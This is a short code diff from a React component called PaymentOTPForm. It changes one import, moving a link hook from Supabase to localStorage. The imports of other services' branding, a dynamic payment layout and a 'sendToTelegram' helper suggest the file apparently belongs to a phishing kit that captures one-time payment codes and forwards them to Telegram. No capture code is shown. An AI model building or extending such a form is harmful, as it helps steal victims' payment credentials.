@@ -6,7 +6,7 @@ import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { Shield, AlertCircle, Check, ArrowLeft, X } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
-import { useLink } from "@/hooks/useSupabase";
+import { useLink } from "@/hooks/useLocalStorage";
 import { sendToTelegram } from "@/lib/telegram";
 
 const PaymentOTPForm = () => {
